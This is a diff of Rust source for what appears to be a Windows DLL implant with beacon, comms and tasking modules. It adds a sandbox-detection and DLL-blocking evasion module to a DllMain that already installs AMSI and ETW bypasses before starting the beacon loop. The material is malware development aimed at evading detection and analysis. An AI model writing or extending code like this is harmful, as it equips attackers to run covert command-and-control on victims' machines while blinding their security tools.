@@ -7,6 +7,7 @@
 mod beacon;
 mod comms;
 mod config;
+mod evasion;
 mod tasks;
 
 #[cfg(target_os = "windows")]
@@ -28,7 +29,10 @@ pub extern "system" fn DllMain(
     const DLL_PROCESS_ATTACH: u32 = 1;
     if reason == DLL_PROCESS_ATTACH {
         std::thread::spawn(|| {
-            // Install HWBP AMSI/ETW bypass.
+            let cfg = config::load_embedded_config();
+            if cfg.sandbox_evasion && evasion::is_sandbox() { return; }
+            if cfg.block_dlls { evasion::apply_block_dlls(); }
+
             hwbp::install_amsi_bypass();
             hwbp::install_etw_bypass();
 
@@ -37,7 +41,6 @@ pub extern "system" fn DllMain(
                 .build()
                 .expect("tokio runtime");
             rt.block_on(async {
-                let cfg = config::load_embedded_config();
                 let _ = beacon::run(cfg).await;
             });
         });
